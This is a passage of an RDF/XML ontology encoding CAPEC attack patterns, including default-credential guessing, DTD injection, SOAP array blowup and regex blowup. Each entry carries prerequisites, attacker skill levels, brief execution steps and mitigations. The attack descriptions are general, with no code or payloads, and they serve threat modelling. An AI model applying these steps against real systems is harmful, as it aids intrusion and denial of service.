    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack283"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker457">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#10"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack457"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::302::118::119::74::99::20::680::733::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application uses environment variables.::An environment variable exposed to the user is vulnerable to a buffer overflow.::The vulnerable environment variable uses untrusted data.::Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker324">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#170"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack324"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::497::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Any web application can be fingerprinted. However  some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Attacker knows how to send HTTP request  SQL query to a web application.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::While simple fingerprinting can be accomplished with only a web browser  for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers  web-site crawlers  and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Authenticate all servers and perform redundant checks when using DNS hostnames.::When possible  use error-correcting (ECC) memory in local devices as non-ECC memory is significantly more vulnerable to faults.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack157"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Commercial defensive technology that monitors for rogue Wi-Fi access points  man-in-the-middle attacks  and anomalous activity with the mobile device baseband radios.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack8"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker278">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#458"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack278"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker145">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#70">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:49::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Try Common or Default Usernames and Passwords"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack145">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#70"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::521::262::263::798::693::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::521::262::263::798::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The system uses one factor password based authentication.The adversary has the means to interact with the system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An adversary just needs to gain access to common default usernames/passwords specific to the technologies used by the system. Additionally  a brute force attack leveraging common passwords can be easily realized if the user name is known.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Technology or vendor specific list of default usernames and passwords.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker144">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#493">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:130::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#SOAP Array Blowup"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack144">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#493"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the attacker to know the endpoint of the web service  and be able to reach the endpoint with a malicious SOAP message.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker277">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#228">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:250::NATURE:CanFollow:CAPEC ID:280::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#DTD Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack277">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#228"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::829::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the target) Using a browser or an automated tool  an attacker records all instances of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Explore:DESCRIPTION:(Determine use of XML with DTDs) Examine application input to identify XML input that leverage the use of one or more DTDs.TECHNIQUE:Examine any available documentation for the application that discusses expected XML input.:TECHNIQUE:Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD.::STEP:3:PHASE:Exploit:DESCRIPTION:(Craft and inject XML containg malicious DTD payload)TECHNIQUE:Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.:TECHNIQUE:Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information  execute abitrary code  create a Denial of Service of the targeted server  or several other malicious impacts.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::829::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must be running an XML based application that leverages DTDs.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker276">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#273"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack276"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::74::436::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted server must allow the attacker to insert content that will appear in the server&apos;s response.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker143">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#492">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:130::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Regular Expression Exponential Blowup"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack143">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#492"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::400::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::400::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the ability to identify hosts running a poorly implemented Regex  and the ability to send crafted input to exploit the regular expression.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker275">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#462"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack275"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::385::352::208::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Ability to issue GET / POST requests cross domainJava Script is enabled in the victim&apos;s browserThe victim has an active session with the site from which the attacker would like to receive informationThe victim&apos;s site does not protect search functionality with cross site request forgery (CSRF) protection::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Some knowledge of Java Script:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to issue GET / POST requests cross domain::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker142">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#490"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack142"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Employ a robust network defensive posture that includes a managed IDS/IPS.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack189"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker149">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#117"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack149"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::319::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must transmit data over a medium that is accessible to the adversary.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP  the capability to run tcpdump  ethereal  etc. can be useful. Depending upon the data being targeted the technological requirements will change.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker452">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#18"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack452"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::80::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target client software must allow the execution of scripts generated by remote hosts.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To achieve a redirection and use of less trusted source  an adversary can simply edit content such as XML payload or HTML files that are sent to client machine.:LEVEL:Low::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser&apos;s executable process.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to include malicious script in document  e.g. HTML file  or XML document. Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker451">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#92"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack451"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::190::128::120::122::196::680::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker can manipulate the value of an integer variable utilized by the target host.::The target host does not do proper range checking on the variable before utilizing it.::When the integer variable is incremented or decremented to an out of range value  it gets a very different value (e.g. very small or negative number)::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker can simply overflow an integer by inserting an out of range value.:LEVEL:Low::SKILL:Exploiting a buffer overflow by injecting malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker148">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#447"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack148"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to system design documentation prior to the development phase. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn&apos;t normally have.::Ability to forge web communications to deliver modified design documentation.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure proper permissions are set for Registry hives to prevent users from modifying keys.::Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.::Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications  utilities  and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack86">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#203">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:176::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Manipulate Registry Information"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::15::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type  character  and encoding enforcement.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all content coming from the client is using the same encoding; if not  the server-side application must canonicalize the data before applying any filtering.::Implementation: Perform input validation for all remote content  including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser  web servers  and plug in technologies  staying current on patch release that deal with XSS countermeasures mitigates this.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack216"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker450">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#40"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack450"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::77::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::User terminals must have a permissive access control such as world writeable that allows normal users to control data on other user&apos;s terminals.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to discover permissions on terminal devices. Of course  brute force can also be used.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Access to a terminal on the target network::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Applications should insure that the content of the file is consistent with format it is expecting  and not depend solely on the file extension.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack446"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker147">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#148"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack147"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::345::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which he/she is not authorized.If the content is to be modified in transit  the adversary must be able to intercept the targeted messages.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::If the content is to be modified in transit  the adversary requires a tool capable of intercepting the target&apos;s communication and generating/creating custom packets to impact the communications. In some variants  the targeted content is altered so that all or some of it is redirected towards content published by the attacker (for example  images and frames in the target&apos;s web site might be modified to be loaded from a source controlled by the attacker). In these cases  the attacker requires the necessary resources to host the replacement content.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead  call your Bank  PayPal  eBay  etc.  and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also  never reply to any e-mails that ask you to provide sensitive information of any kind.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack411"/>
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack181"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker279">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#533"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack279"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::494::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Advanced knowledge about the download and update installation processes.::Advanced knowledge about the deployed system and its various software subcomponents and processes.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Able to develop malicious code that can be used on the victim&apos;s system while maintaining normal functionality.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker146">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#444"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack146"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the system during the development phase to alter and/or modify software and hardware components. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn&apos;t normally have.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Keep patches up to date by installing weekly or daily if possible.::Shut down unnecessary services/ports.::Change default passwords by choosing strong passwords.::Curtail unexpected input.::Encrypt and password-protect sensitive data.::Avoid including information that has the potential to identify and compromise your organization&apos;s security such as access to business plans  formulas  and proprietary documents.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack69"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Protect the schema against unauthorized modification.::Implementation: For applications that use a known schema  use a local copy or a known good repository instead of the schema reference supplied in the XML document. Additionally  ensure that the proper permissions are set on local files to avoid unauthorized modification.::Implementation: For applications that leverage remote schemas  use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack42"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Application designers can construct a &apos;code book&apos; for error messages. When using a code book  application error messages aren&apos;t generated in string or stack trace form  but are cataloged and replaced with a unique (often integer-based) value &apos;coding&apos; for the error. Such a technique will require helpdesk and hosting personnel to use a &apos;code book&apos; or similar mapping to decode application errors/logs in order to respond to them normally.::Application designers can wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above &apos;code book&apos; suggestion.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack15">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#54">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:116::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Query System for Information"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::209::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Determine user-controllable parameters of the application::STEP:2:PHASE:Exploit:DESCRIPTION:Inject each parameter with content that causes an error condition to manifest::STEP:3:PHASE:Exploit:DESCRIPTION:Modify the content of each parameter according to observed error conditions::STEP:4:PHASE:Exploit:DESCRIPTION:Repeat above steps with enough parameters until the application has been sufficiently mapped out to launch desired attack (for example  Blind SQL Injection)::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Commercial defensive technology to detect and alert to any attempts to modify mobile technology data flows or to inject new data into existing data flows and signaling data.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack7"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker140">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#486"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack140"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the ability to generate a large amount of UDP traffic to send to the desired port of a target service using UDP.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all configuration files and resource are either removed or protected when promoting code into production.::Design: Use browser technologies that do not allow client side scripting.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack458"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker274">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#184"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack274"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::494::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Software Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy  existing countermeasures which must be bypassed  and the success of early phase attack vectors.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker141">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#528">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:125::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XML Flood"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack141">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#528"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes>
